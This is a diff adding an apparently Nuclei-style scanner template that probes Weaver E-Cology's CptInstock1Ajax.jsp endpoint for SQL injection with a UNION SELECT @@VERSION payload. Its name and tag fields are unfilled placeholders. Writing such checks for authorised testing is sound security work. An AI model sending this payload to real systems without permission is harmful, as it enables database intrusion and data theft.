@@ -1,0 +1,20 @@
+id: E-Cology-CptInstock1Ajax-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 泛微E-Cology系统接口CptInstock1Ajax存在SQL注入漏洞，可获取数据库权限，导致数据泄露。。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3CptInstock1Ajax%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1#"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'price'
